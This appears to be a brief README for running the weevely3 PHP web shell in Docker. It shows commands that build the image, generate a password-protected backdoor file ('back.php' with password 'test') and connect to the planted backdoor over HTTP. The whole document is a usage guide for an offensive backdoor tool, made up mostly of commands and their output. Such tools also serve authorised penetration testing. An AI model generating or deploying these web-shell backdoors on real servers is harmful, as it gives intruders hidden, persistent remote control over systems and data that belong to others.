#### 1. About

- URL: `https://github.com/epinna/weevely3`
- weaponized PHP web shell


#### 2. Build
```
# docker build -t weevely .
```


#### 3. Example

Generate backdoor:
```
# touch /tmp/back.php
# docker run --rm -it -v /tmp/back.php:/x weevely generate test /x
Generated '/x' with password 'test' of 792 byte size.
```

Use the backdoor after deployment:
```
# cd /tmp/ && php -S 0.0.0.0:8080
# docker run --rm -it weevely http://172.16.201.160:8080/back.php test
```
